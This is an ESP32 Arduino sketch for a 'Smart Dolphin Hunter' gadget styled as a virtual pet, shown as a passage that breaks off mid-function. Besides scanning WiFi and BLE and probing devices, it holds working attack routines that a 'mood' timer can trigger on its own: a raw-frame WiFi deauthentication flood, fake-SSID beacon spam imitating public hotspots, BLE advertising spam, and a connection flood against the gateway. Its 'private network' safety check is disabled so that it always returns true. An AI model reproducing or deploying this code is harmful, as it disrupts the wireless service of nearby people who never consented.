#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <WiFi.h>
#include <Preferences.h>
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <BLEClient.h>
#include <BLEUtils.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
#define OLED_ADDR 0x3C
#define SDA_PIN 6
#define SCL_PIN 5  
#define BTN_UP 7
#define BTN_DOWN 10
#define BTN_OK 20      
#define BTN_MENU 21    
#define BUZZER_PIN 2

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
Preferences prefs;

struct PetStats {
  int stage, xp, hunger, happiness, energy, age, weight;
  int totalNetworks, totalDevices, rareDevices, totalBLEDevices;
  int vulnerableDevices, criticalFinds, verifiedVulns;
  unsigned long lastFeed, lastUpdate, lastSave, uptime;

  int mood;  // -100 to 100
  int aggressionLevel;  // 0-100
  unsigned long lastMoodUpdate;
  unsigned long lastAttackTime;
  bool isAngry;
} pet;

const int XP_THRESHOLDS[] = {0, 100, 300, 700, 1500, 3000, 5000, 8000, 99999};
const char* STAGE_NAMES[] = {"EGG", "HATCH", "BABY", "YOUNG", "TEEN", "ADULT", "ELDER", "CYBER"};

struct BLEVulnerability {
  const char* pattern;
  const char* vulnName;
  int severity, xpReward;
  const char* serviceUUID;
  bool needsProbe;
};

const BLEVulnerability BLE_VULNS[] = {
  {"Mi Band", "Unauth Pairing", 4, 120, "0000fee0-0000-1000-8000-00805f9b34fb", true},
  {"Fitness", "No Encryption", 4, 120, "0000180d-0000-1000-8000-00805f9b34fb", true},
  {"Smart Lock", "Default PIN", 4, 150, "00001800-0000-1000-8000-00805f9b34fb", true},
  {"Camera", "Open RTSP", 4, 140, "0000180f-0000-1000-8000-00805f9b34fb", true},
  {"Headphone", "BIAS Attack", 3, 90, "0000110b-0000-1000-8000-00805f9b34fb", true},
  {"Speaker", "BlueBorne", 3, 100, "0000110b-0000-1000-8000-00805f9b34fb", true},
  {"Keyboard", "KNOB Attack", 3, 90, "00001812-0000-1000-8000-00805f9b34fb", true},
  {"Mouse", "Sniffing Risk", 3, 80, "00001812-0000-1000-8000-00805f9b34fb", true},
  {"Heart", "Data Leak", 3, 90, "0000180d-0000-1000-8000-00805f9b34fb", true},
  {"Watch", "Weak Pairing", 2, 50, "00001805-0000-1000-8000-00805f9b34fb", false},
  {"Tracker", "No Auth", 2, 50, "0000180f-0000-1000-8000-00805f9b34fb", false},
  {"Phone", "Old Protocol", 2, 40, "0000110e-0000-1000-8000-00805f9b34fb", false},
  {"TV", "Open Service", 2, 45, "00001800-0000-1000-8000-00805f9b34fb", false},
  {"Car", "CAN Exposure", 2, 60, "0000fff0-0000-1000-8000-00805f9b34fb", false},
  {"Beacon", "Info Disclosure", 1, 25, "", false},
  {"Tag", "Trackable", 1, 20, "", false},
  {"Sensor", "Weak Signal", 1, 25, "", false}
};
const int BLE_VULNS_COUNT = 17;

struct VulnerablePort {
  int port;
  const char* service;
  int severity, xpReward;
};

const VulnerablePort VULN_PORTS[] = {
  {21, "FTP", 4, 150}, {23, "Telnet", 4, 180}, {445, "SMB", 4, 165},
  {3389, "RDP", 4, 150}, {1433, "MSSQL", 4, 135}, {3306, "MySQL", 4, 135},
  {5900, "VNC", 4, 150}, {22, "SSH", 3, 100}, {25, "SMTP", 3, 90},
  {53, "DNS", 3, 100}, {110, "POP3", 3, 90}, {143, "IMAP", 3, 90},
  {135, "RPC", 3, 120}, {139, "NetBIOS", 3, 100}, {161, "SNMP", 3, 120},
  {389, "LDAP", 3, 100}, {1723, "PPTP", 3, 90}, {5060, "SIP", 3, 100},
  {8080, "HTTP-ALT", 3, 90}, {6379, "Redis", 3, 120}, {80, "HTTP", 2, 60},
  {443, "HTTPS", 2, 45}, {554, "RTSP", 2, 75}, {1883, "MQTT", 2, 90},
  {8883, "MQTT-TLS", 2, 75}, {5432, "PostgreSQL", 2, 75}, 
  {27017, "MongoDB", 2, 100}, {9200, "Elasticsearch", 2, 90},
  {5001, "Synology", 3, 110}, {10000, "Webmin", 3, 110}
};
const int VULN_PORTS_COUNT = 46;

struct ScanResult {
  char ssid[33];
  int deviceCount, xpGained;
  unsigned long timestamp;
  bool hasRouter, hasCamera, hasMQTT, hasWeb, isBLEScan;
  int bleDevices, vulnerableCount;
  char topVuln[20];
  int vulnerablePorts, criticalServices, verifiedVulns;
};

#define MAX_HISTORY 8
ScanResult scanHistory[MAX_HISTORY];
int historyCount = 0;

struct BLEDevice_t {
  String name, address;
  int rssi, severity;
  bool isVulnerable, verified, probeAttempted;
  char vulnName[20];
};

#define MAX_BLE_DEVICES 15
BLEDevice_t bleDevices[MAX_BLE_DEVICES];
int bleDeviceCount = 0;
String lastFoundMAC, lastFoundName;
unsigned long lastFoundTime = 0;
bool hasScannedOnce = false;

struct NetworkDevice {
  IPAddress ip;
  int openPorts, vulnPorts, severity;
  bool isRouter, isCamera, isMQTT;
  String macAddress;
};

#define MAX_NETWORK_DEVICES 15
NetworkDevice networkDevices[MAX_NETWORK_DEVICES];
int networkDeviceCount = 0;

struct WiFiNetwork {
  String ssid, macAddress;
  int rssi;
  wifi_auth_mode_t encryption;
  bool isOpen;
};

#define MAX_WIFI_NETWORKS 15
WiFiNetwork wifiNetworks[MAX_WIFI_NETWORKS];
int wifiNetworkCount = 0;
int wifiSelectorIndex = 0;
int wifiSelectorScroll = 0;

const char KEYBOARD_CHARS[] = 
  "abcdefghijklmnopqrstuvwxyz"
  "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
  "0123456789"
  "!@#$%^&*()_+-=[]{}|;:',.<>?/`~ ";

#define KEYBOARD_COLS 10
#define KEYBOARD_ROWS 10
int keyboardX = 0, keyboardY = 0;
char passwordBuffer[48];
int passwordLen = 0;

int animFrame = 0;
unsigned long lastAnimUpdate = 0, lastBlink = 0;
bool isBlinking = false;
int scanWaveRadius = 0, scanWavePhase = 0;
bool scanPulse = false;
int scanParticles[8][3];

struct ScanProgress {
  int currentIP, totalIPs, currentPort, portsScanned;
  int devicesFound, vulnsFound;
  char currentActivity[25];
  unsigned long activityStartTime;
  bool isActive;
  String currentMAC;
} scanProgress;

struct BLEScanProgress {
  int devicesFound, vulnsFound, criticalFound, verifiedCount;
  char lastDevice[32];
  String lastMAC;
  unsigned long scanStartTime;
  bool isActive, probing;
} bleScanProgress;

enum GameState {
  STATE_PET, STATE_MENU, STATE_STATS, STATE_HISTORY, STATE_SETTINGS,
  STATE_SCANNING, STATE_CONNECTED, STATE_BLE_SCANNING, STATE_BLE_RESULTS,
  STATE_WIFI_SETUP, STATE_WIFI_SELECTOR, STATE_WIFI_PASSWORD, STATE_WIFI_CONNECTING
};
GameState currentState = STATE_PET;
int menuSelection = 0, historyScroll = 0;

enum PetAction {
  ACTION_IDLE, ACTION_HAPPY, ACTION_EATING, ACTION_SCANNING,
  ACTION_SLEEPING, ACTION_JUMPING, ACTION_BLE_SCAN, ACTION_CELEBRATING, ACTION_ATTACKING,
  ACTION_ANGRY,  // TAMBAH INI
  ACTION_DEAUTH, // TAMBAH INI
  ACTION_BLE_JAM // TAMBAH INI
};
PetAction currentAction = ACTION_IDLE;
unsigned long actionUntil = 0;

bool wifiScanning = false, networkScanning = false, bleScanning = false;
unsigned long nextWiFiScan = 0, nextBLEScan = 0;
const unsigned long WIFI_SCAN_INTERVAL = 180000;
const unsigned long BLE_SCAN_INTERVAL = 60000;
String currentSSID = "", currentBSSID = "";

BLEScan* pBLEScan = nullptr;
BLEClient* pBLEClient = nullptr;

struct Settings {
  bool sleepEnabled, beepEnabled, bleEnabled, aggressiveScan, activeProbe;
  int sleepStart, sleepEnd, scanInterval, volume, bleScanTime;
  bool moodEnabled;
  int moodAggressionThreshold;
  int attackCooldown;
} settings;

unsigned long wifiInfoLastSwitch = 0;
int wifiInfoPage = 0;  // 0: Saved Network + Our MAC, 1: Scan button + extra info
int wifiSetupPage = 0;  // 0 = halaman info SSID & MAC, 1 = halaman instruksi tombol

struct WiFiCredentials {
  char ssid[33], password[64];
  bool hasSaved;
} wifiCreds;
// Forward Declarations
void drawPetScreen();
void drawMenu();
void drawStats();
void drawHistory();
void drawSettings();
void drawScanningScreen();
void drawBLEScanningScreen();
void drawBLEResultsScreen();
void drawWiFiSetup();
void drawWiFiSelector();
void drawWiFiPasswordInput();
void drawWiFiConnecting();
void drawDolphin(int x, int y, int stage, PetAction action, int frame);
void drawEgg(int x, int y, int frame);
void drawHatchling(int x, int y, PetAction action, int frame);
void drawBaby(int x, int y, PetAction action, int frame);
void drawYoung(int x, int y, PetAction action, int frame);
void drawTeen(int x, int y, PetAction action, int frame);
void drawAdult(int x, int y, PetAction action, int frame);
void drawElder(int x, int y, PetAction action, int frame);
void drawCyber(int x, int y, PetAction action, int frame);
void drawScanWaves(int x, int y, bool isBLE);
void initScanParticles();
void updateScanParticles();
void updatePetStats();
void checkEvolution();
void addXP(int amount);
void startWiFiScan();
void startWiFiScanForSelector();
void startBLEScan();
void performNetworkScan();
void connectToSelectedWiFi();
bool probeBLEVulnerability(String address, int vulnIndex);
void saveProgress();
bool loadProgress();
void handleButtons();
void beep(int pattern);
String getMACAddress(IPAddress ip);

void showMessage(const char* msg, int duration = 1000) {
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(10, 28);
  display.print(msg);
  display.display();
  delay(duration);
}

class MyAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice advertisedDevice) {
    if (bleDeviceCount >= MAX_BLE_DEVICES) return;
    
    String deviceName = advertisedDevice.getName().c_str();
    String deviceAddr = advertisedDevice.getAddress().toString().c_str();
    int rssi = advertisedDevice.getRSSI();
    
    if (deviceName.length() == 0) deviceName = "Unknown";
    
    for (int i = 0; i < bleDeviceCount; i++) {
      if (bleDevices[i].address == deviceAddr) return;
    }
    
    bleDevices[bleDeviceCount].name = deviceName;
    bleDevices[bleDeviceCount].address = deviceAddr;
    bleDevices[bleDeviceCount].rssi = rssi;
    bleDevices[bleDeviceCount].isVulnerable = false;
    bleDevices[bleDeviceCount].severity = 0;
    bleDevices[bleDeviceCount].verified = false;
    bleDevices[bleDeviceCount].probeAttempted = false;
    
    lastFoundMAC = deviceAddr;
    lastFoundName = deviceName;
    lastFoundTime = millis();
    bleScanProgress.lastMAC = deviceAddr;
    
    int matchedVulnIndex = -1;
    for (int i = 0; i < BLE_VULNS_COUNT; i++) {
      if (deviceName.indexOf(BLE_VULNS[i].pattern) >= 0) {
        bleDevices[bleDeviceCount].isVulnerable = true;
        bleDevices[bleDeviceCount].severity = BLE_VULNS[i].severity;
        strncpy(bleDevices[bleDeviceCount].vulnName, BLE_VULNS[i].vulnName, 19);
        bleDevices[bleDeviceCount].vulnName[19] = '\0';
        matchedVulnIndex = i;
        
        bleScanProgress.vulnsFound++;
        if (BLE_VULNS[i].severity >= 4) {
          bleScanProgress.criticalFound++;
        }
        
        if (settings.beepEnabled) tone(BUZZER_PIN, 2000, 50);
        break;
      }
    }
    
    bleScanProgress.devicesFound++;
    strncpy(bleScanProgress.lastDevice, deviceName.c_str(), 31);
    bleScanProgress.lastDevice[31] = '\0';
    bleDeviceCount++;
    
    if (settings.beepEnabled && bleDeviceCount % 3 == 0) {
      tone(BUZZER_PIN, 1200, 30);
    }
    
    if (settings.activeProbe && matchedVulnIndex >= 0 && BLE_VULNS[matchedVulnIndex].needsProbe) {
      bleScanProgress.probing = true;
      delay(100);
      
      bool probed = probeBLEVulnerability(deviceAddr, matchedVulnIndex);
      bleDevices[bleDeviceCount - 1].probeAttempted = true;
      
      if (probed) {
        bleDevices[bleDeviceCount - 1].verified = true;
        bleScanProgress.verifiedCount++;
        
        if (settings.beepEnabled) {
          tone(BUZZER_PIN, 2500, 100);
          delay(120);
          tone(BUZZER_PIN, 2500, 100);
        }
      }
      bleScanProgress.probing = false;
    }
  }
};

bool probeBLEVulnerability(String address, int vulnIndex) {
  if (vulnIndex < 0 || vulnIndex >= BLE_VULNS_COUNT) return false;
  if (!BLE_VULNS[vulnIndex].needsProbe) return false;
  
  if (pBLEClient == nullptr) {
    pBLEClient = BLEDevice::createClient();
    if (pBLEClient == nullptr) return false;
  }
  
  BLEAddress bleAddress(address.c_str());
  
  if (!pBLEClient->connect(bleAddress)) return false;
  
  bool vulnerable = false;
  
  if (strlen(BLE_VULNS[vulnIndex].serviceUUID) > 0) {
    BLEUUID serviceUUID(BLE_VULNS[vulnIndex].serviceUUID);
    BLERemoteService* pRemoteService = pBLEClient->getService(serviceUUID);
    
    if (pRemoteService != nullptr) {
      std::map<std::string, BLERemoteCharacteristic*>* pCharMap = 
        pRemoteService->getCharacteristics();
      
      if (pCharMap != nullptr && pCharMap->size() > 0) {
        vulnerable = true;
      }
    }
  }
  
  pBLEClient->disconnect();
  delay(100);
  
  return vulnerable;
}

void initScanParticles() {
  for (int i = 0; i < 8; i++) {
    scanParticles[i][0] = random(-20, 20);
    scanParticles[i][1] = random(-20, 20);
    scanParticles[i][2] = random(10, 30);
  }
}

void updateScanParticles() {
  for (int i = 0; i < 8; i++) {
    scanParticles[i][2]--;
    if (scanParticles[i][2] <= 0) {
      scanParticles[i][0] = random(-20, 20);
      scanParticles[i][1] = random(-20, 20);
      scanParticles[i][2] = random(10, 30);
    }
  }
}
void setup() {
  Serial.begin(115200);
  
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_OK, INPUT_PULLUP);
  pinMode(BTN_MENU, INPUT_PULLUP);
  pinMode(BUZZER_PIN, OUTPUT);

  Wire.begin(SDA_PIN, SCL_PIN);

  if (!display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDR)) {
    while (1);
  }

  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(2);
  display.setCursor(10, 10);
  display.print(F("SMART"));
  display.setCursor(10, 28);
  display.print(F("DOLPHIN"));
  display.setTextSize(1);
  display.setCursor(5, 46);
  display.print(F("Hunter"));
  display.setCursor(25, 56);
  display.print(F("v2.0 AGGRO"));
  display.display();
  delay(2500);

  prefs.begin("dolphin", false);
  settings.sleepEnabled = prefs.getBool("sleepEn", true);
  settings.sleepStart = prefs.getInt("sleepS", 22);
  settings.sleepEnd = prefs.getInt("sleepE", 7);
  settings.scanInterval = prefs.getInt("scanInt", 3);
  settings.beepEnabled = prefs.getBool("beepEn", true);
  settings.volume = prefs.getInt("volume", 2);
  settings.bleEnabled = prefs.getBool("bleEn", true);
  settings.bleScanTime = prefs.getInt("bleTime", 15);
  settings.aggressiveScan = prefs.getBool("aggressive", true);
  settings.activeProbe = prefs.getBool("activeProbe", true);
  
  settings.moodEnabled = prefs.getBool("moodEn", true);
  settings.moodAggressionThreshold = prefs.getInt("moodThresh", 70);
  settings.attackCooldown = prefs.getInt("attackCD", 300); // 5 menit

  wifiCreds.hasSaved = prefs.getBool("wifiSaved", false);
  if (wifiCreds.hasSaved) {
    String ssid = prefs.getString("wifiSSID", "");
    String pass = prefs.getString("wifiPass", "");
    ssid.toCharArray(wifiCreds.ssid, 33);
    pass.toCharArray(wifiCreds.password, 64);
  } else {
    wifiCreds.ssid[0] = '\0';
    wifiCreds.password[0] = '\0';
  }

  if (!loadProgress()) {
    pet.stage = 0;
    pet.xp = 0;
    pet.hunger = 50;
    pet.happiness = 80;
    pet.energy = 100;
    pet.age = 0;
    pet.weight = 5;
    pet.totalNetworks = 0;
    pet.totalDevices = 0;
    pet.rareDevices = 0;
    pet.totalBLEDevices = 0;
    pet.vulnerableDevices = 0;
    pet.criticalFinds = 0;
    pet.verifiedVulns = 0;
    pet.lastFeed = millis();
    pet.lastUpdate = millis();
    pet.lastSave = millis();
    pet.uptime = 0;

    pet.mood = 50;
    pet.aggressionLevel = 0;
    pet.lastMoodUpdate = millis();
    pet.lastAttackTime = 0;
    pet.isAngry = false;

    showMessage("New pet born!", 2500);
    beep(1);
  } else {
    display.clearDisplay();
    display.setTextSize(1);
    display.setCursor(15, 12);
    display.print(F("Welcome back!"));
    display.setCursor(5, 25);
    display.print(F("Stage: "));
    display.print(STAGE_NAMES[pet.stage]);
    display.setCursor(5, 35);
    display.print(F("Vulns: "));
    display.print(pet.vulnerableDevices);
    display.print(F(" | XP: "));
    display.print(pet.xp);
    display.setCursor(5, 45);
    display.print(F("Verified: "));
    display.print(pet.verifiedVulns);
    display.display();
    beep(2);
    delay(2000);
  }

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  if (wifiCreds.hasSaved) {
    display.clearDisplay();
    display.setTextSize(1);
    display.setCursor(10, 20);
    display.print(F("Connecting to:"));
    display.setCursor(5, 35);
    display.print(wifiCreds.ssid);
    display.display();
    
    WiFi.begin(wifiCreds.ssid, wifiCreds.password);
    int attempts = 0;
    while (WiFi.status() != WL_CONNECTED && attempts < 20) {
      delay(500);
      attempts++;
    }
    
    if (WiFi.status() == WL_CONNECTED) {
      display.clearDisplay();
      display.setCursor(15, 15);
      display.print(F("WiFi Connected!"));
      display.setCursor(5, 30);
      display.print(WiFi.localIP());
      display.setCursor(0, 40);
      display.print(F("MAC:"));
      display.print(WiFi.macAddress());
      display.display();
      beep(2);
      delay(2500);
    } else {
      showMessage("WiFi Failed", 1500);
    }
    WiFi.disconnect();
  }

  if (settings.bleEnabled) {
    BLEDevice::init("DolphinHunter");
    pBLEScan = BLEDevice::getScan();
    if (pBLEScan != nullptr) {
      pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
      pBLEScan->setActiveScan(true);
      pBLEScan->setInterval(100);
      pBLEScan->setWindow(99);
    }
  }

  scanProgress.isActive = false;
  scanProgress.totalIPs = settings.aggressiveScan ? 50 : 30;
  bleScanProgress.isActive = false;
  bleScanProgress.probing = false;
  bleScanProgress.verifiedCount = 0;
  
  randomSeed(analogRead(0));
  initScanParticles();
  
  nextWiFiScan = millis() + 5000;
  nextBLEScan = millis() + 2000;
  hasScannedOnce = false;
  showMoodWarning();
}

void showMoodWarning() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(5, 5);
  display.print(F("MOOD SYSTEM ACTIVE"));
  display.setCursor(0, 20);
  display.print(F("Dolphin can get angry"));
  display.setCursor(0, 30);
  display.print(F("and attack nearby"));
  display.setCursor(0, 40);
  display.print(F("devices! Keep it happy"));
  display.setCursor(0, 50);
  display.print(F("with scans and food."));
  display.display();
  delay(4000);
}

void updateMood() {
  if (!settings.moodEnabled) return;
  
  unsigned long now = millis();
  
  // Update mood setiap 30 detik
  if (now - pet.lastMoodUpdate > 30000) {
    pet.lastMoodUpdate = now;
    
    int moodChange = 0;
    
    // Faktor positif
    if (pet.hunger > 70) moodChange += 5;
    if (pet.happiness > 70) moodChange += 8;
    if (pet.energy > 70) moodChange += 3;
    
    // Faktor negatif
    if (pet.hunger < 30) moodChange -= 10;
    if (pet.happiness < 30) moodChange -= 15;
    if (pet.energy < 30) moodChange -= 8;
    
    // Waktu tanpa aksi
    if (now - pet.lastAttackTime > 3600000) { // 1 jam
      moodChange -= 5;
    }
    
    // Waktu tanpa scanning
    if (now - scanProgress.activityStartTime > 1800000) { // 30 menit
      moodChange -= 3;
    }
    
    // Update mood
    pet.mood += moodChange;
    pet.mood = constrain(pet.mood, -100, 100);
    
    // Update aggression level
    if (pet.mood < 0) {
      pet.aggressionLevel = map(abs(pet.mood), 0, 100, 0, 100);
    } else {
      pet.aggressionLevel = max(0, pet.aggressionLevel - 2);
    }
    
    // Cek jika perlu serang
    if (pet.mood < -40 && pet.aggressionLevel > settings.moodAggressionThreshold) {
      pet.isAngry = true;
      if (now - pet.lastAttackTime > settings.attackCooldown * 1000) {
        startAggressiveAttack();
      }
    } else {
      pet.isAngry = false;
    }
  }
}

bool isPrivateNetwork() {
  return true;
  /*IPAddress ip = WiFi.localIP();
  return (ip[0] == 192 && ip[1] == 168) ||  // 192.168.x.x
         (ip[0] == 172 && ip[1] >= 16 && ip[1] <= 31) || // 172.16-31.x.x
         (ip[0] == 10); // 10.x.x.x*/
}

bool confirmAttack() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(10, 5);
  display.print(F("WARNING!"));
  display.setCursor(0, 20);
  display.print(F("Dolphin is ANGRY!"));
  display.setCursor(0, 30);
  display.print(F("Mood: "));
  display.print(pet.mood);
  display.setCursor(0, 40);
  display.print(F("Will attack in 5s"));
  display.setCursor(0, 50);
  display.print(F("[OK] Cancel attack"));
  display.display();
  
  unsigned long startTime = millis();
  
  while (millis() - startTime < 5000) {
    if (digitalRead(BTN_OK) == LOW) {
      beep(2);
      return false;
    }
    
    display.fillRect(0, 55, 128, 9, SSD1306_BLACK);
    display.setCursor(50, 55);
    int remaining = (5000 - (millis() - startTime)) / 1000;
    display.print(remaining);
    display.print(F("s"));
    display.display();
    
    delay(100);
  }
  
  return true;
}

void startAggressiveAttack() {
  if (!isPrivateNetwork()) {
    display.clearDisplay();
    display.setCursor(5, 20);
    display.print(F("SAFETY LOCK!"));
    display.setCursor(5, 35);
    display.print(F("Not in private net"));
    display.setCursor(5, 50);
    display.print(F("Attack blocked"));
    display.display();
    delay(3000);
    return;
  }
  
  if (!confirmAttack()) {
    pet.mood += 20;
    pet.aggressionLevel -= 30;
    display.clearDisplay();
    display.setCursor(15, 25);
    display.print(F("Attack cancelled"));
    display.setCursor(10, 40);
    display.print(F("Dolphin calmed"));
    display.display();
    delay(2000);
    return;
  }
  
  pet.lastAttackTime = millis();
  int attackType = random(0, 4);
  
  switch(attackType) {
    case 0:
      limitedDeauthAttack();
      break;
    case 1:
      wifiBeaconSpam();
      break;
    case 2:
      bleSpamAttack();
      break;
    case 3:
      portFloodAttack();
      break;
  }
  
  // Aftermath
  pet.mood += 40;
  pet.aggressionLevel -= 50;
  pet.happiness += 25;
  pet.energy -= 25;
  pet.xp += 100;
  
  pet.mood = constrain(pet.mood, -100, 100);
  pet.aggressionLevel = constrain(pet.aggressionLevel, 0, 100);
  pet.happiness = constrain(pet.happiness, 0, 100);
  pet.energy = constrain(pet.energy, 0, 100);
  
  // Log attack
  if (historyCount < MAX_HISTORY) {
    scanHistory[historyCount].timestamp = millis();
    strcpy(scanHistory[historyCount].ssid, "[ANGER ATTACK]");
    scanHistory[historyCount].xpGained = 100;
    scanHistory[historyCount].criticalServices = 1;
    scanHistory[historyCount].isBLEScan = false;
    historyCount++;
  }
  
  saveProgress();
}

void limitedDeauthAttack() {
  currentAction = ACTION_DEAUTH;
  actionUntil = millis() + 8000;
  
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(5, 5);
  display.print(F("[ANGER] DEAUTH ATTACK"));
  display.setCursor(0, 20);
  display.print(F("Target: Broadcast"));
  display.setCursor(0, 30);
  display.print(F("Duration: 8 seconds"));
  display.setCursor(0, 40);
  display.print(F("Rate: 10 packets/s"));
  display.setCursor(0, 50);
  display.print(F("For awareness only"));
  display.display();
  
  beep(5);
  delay(1000);
  
  // Setup monitor mode
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);
  
  // Deauth packet template
  uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (dummy)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,
    0x07, 0x00
  };
  
  unsigned long startTime = millis();
  int packetCount = 0;
  
  while (millis() - startTime < 8000) {
    // Update display
    display.fillRect(0, 55, 128, 9, SSD1306_BLACK);
    display.setCursor(0, 55);
    display.print(F("Packets: "));
    display.print(packetCount);
    display.setCursor(70, 55);
    display.print(F("Time: "));
    display.print((8000 - (millis() - startTime)) / 1000);
    display.print(F("s"));
    display.display();
    
    // Send deauth packet
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, 26, false);
    packetCount++;
    
    delay(100); // 10 packets per second
    
    if (packetCount % 10 == 0) {
      beep(1);
    }
  }
  
  // Restore WiFi mode
  esp_wifi_stop();
  WiFi.mode(WIFI_STA);
  
  display.clearDisplay();
  display.setCursor(10, 20);
  display.print(F("Deauth Complete!"));
  display.setCursor(5, 35);
  display.print(F("Sent "));
  display.print(packetCount);
  display.print(F(" packets"));
  display.setCursor(5, 50);
  display.print(F("Check WiFi stability"));
  display.display();
  delay(3000);
}

void wifiBeaconSpam() {
  currentAction = ACTION_ATTACKING;
  actionUntil = millis() + 10000;
  
  const char* fakeSSIDs[] = {
    "Free_WiFi_Please_Connect",
    "Airport_Free_WiFi",
    "Starbucks_Guest",
    "Hotel_Guest_Access",
    "AndroidAP_1234",
    "iPhone_Network",
    "Linksys_Setup",
    "NETGEAR_Setup",
    "TP-Link_Config",
    "Public_WiFi_No_Pass"
  };
  
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(5, 5);
  display.print(F("[ANGER] BEACON SPAM"));
  display.setCursor(0, 20);
  display.print(F("Creating fake APs"));
  display.setCursor(0, 30);
  display.print(F("Duration: 10 seconds"));
  display.setCursor(0, 40);
  display.print(F("SSIDs: 10 rotating"));
  display.display();
  
  WiFi.mode(WIFI_AP);
  
  unsigned long startTime = millis();
  int ssidCount = 0;
  
  while (millis() - startTime < 10000) {
    int idx = random(0, 10);
    WiFi.softAP(fakeSSIDs[idx], NULL, random(1, 12), 0, 1);
    ssidCount++;
    
    display.fillRect(0, 50, 128, 14, SSD1306_BLACK);
    display.setCursor(0, 50);
    display.print(F("AP: "));
    String ssid = fakeSSIDs[idx];
    if (ssid.length() > 15) ssid = ssid.substring(0, 14) + ".";
    display.print(ssid);
    display.setCursor(0, 60);
    display.print(F("Count: "));
    display.print(ssidCount);
    display.display();
    
    if (ssidCount % 5 == 0) beep(1);
    delay(500);
  }
  
  WiFi.mode(WIFI_STA);
  
  display.clearDisplay();
  display.setCursor(10, 20);
  display.print(F("Beacon Spam Done!"));
  display.setCursor(5, 35);
  display.print(F("Created "));
  display.print(ssidCount);
  display.print(F(" fake APs"));
  display.setCursor(5, 50);
  display.print(F("May confuse devices"));
  display.display();
  delay(3000);
}

void bleSpamAttack() {
  currentAction = ACTION_BLE_JAM;
  actionUntil = millis() + 12000;
  
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(5, 5);
  display.print(F("[ANGER] BLE SPAM"));
  display.setCursor(0, 20);
  display.print(F("Advertising fake"));
  display.setCursor(0, 30);
  display.print(F("BLE devices"));
  display.setCursor(0, 40);
  display.print(F("Duration: 12 seconds"));
  display.display();
  
  if (pBLEScan) {
    pBLEScan->stop();
    delay(100);
  }
  
  // Start BLE advertising with random names
  BLEDevice::deinit();
  delay(100);
  
  unsigned long startTime = millis();
  int advCount = 0;
  
  while (millis() - startTime < 12000) {
    String fakeName = "Device_" + String(random(1000, 9999));
    BLEDevice::init(fakeName.c_str());
    
    BLEServer *pServer = BLEDevice::createServer();
    BLEAdvertising *pAdvertising = pServer->getAdvertising();
    
    // Add random services
    for (int i = 0; i < 3; i++) {
      String serviceUUID = "0000";
      for (int j = 0; j < 4; j++) {
        serviceUUID += String(random(0, 16), HEX);
      }
      serviceUUID += "-0000-1000-8000-00805f9b34fb";
      pAdvertising->addServiceUUID(BLEUUID(serviceUUID.c_str()));
    }
    
    pAdvertising->setScanResponse(true);
    pAdvertising->start();
    advCount++;
    
    display.fillRect(0, 50, 128, 14, SSD1306_BLACK);
    display.setCursor(0, 50);
    display.print(F("Adv: "));
    if (fakeName.length() > 12) fakeName = fakeName.substring(0, 11) + ".";
    display.print(fakeName);
    display.setCursor(0, 60);
    display.print(F("Count: "));
    display.print(advCount);
    display.display();
    
    delay(800);
    BLEDevice::deinit();
    delay(200);
    
    if (advCount % 3 == 0) beep(1);
  }
  
  // Restore BLE
  BLEDevice::init("DolphinHunter");
  if (settings.bleEnabled && pBLEScan == nullptr) {
    pBLEScan = BLEDevice::getScan();
    if (pBLEScan != nullptr) {
      pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
      pBLEScan->setActiveScan(true);
      pBLEScan->setInterval(100);
      pBLEScan->setWindow(99);
    }
  }
  
  display.clearDisplay();
  display.setCursor(10, 20);
  display.print(F("BLE Spam Complete!"));
  display.setCursor(5, 35);
  display.print(F("Advertised "));
  display.print(advCount);
  display.print(F(" times"));
  display.setCursor(5, 50);
  display.print(F("May disrupt BLE"));
  display.display();
  delay(3000);
}

void portFloodAttack() {
  currentAction = ACTION_ATTACKING;
  actionUntil = millis() + 15000;
  
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(5, 5);
  display.print(F("[ANGER] PORT FLOOD"));
  display.setCursor(0, 20);
  display.print(F("Flooding common"));
  display.setCursor(0, 30);
  display.print(F("ports on gateway"));
  display.setCursor(0, 40);
  display.print(F("Duration: 15 seconds"));
  display.display();
  
  IPAddress gateway = WiFi.gatewayIP();
  int commonPorts[] = {80, 443, 22, 23, 21, 25, 53, 110, 143, 3389, 8080};
  
  unsigned long startTime = millis();
  int connectionAttempts = 0;
  int successfulConnections = 0;
  
  while (millis() - startTime < 15000) {
    for (int i = 0; i < 11; i++) {
      WiFiClient client;
      if (client.connect(gateway, commonPorts[i], 100)) {
        successfulConnections++;
        client.stop();
      }
      connectionAttempts++;
      
      display.fillRect(0, 50, 128, 14, SSD1306_BLACK);
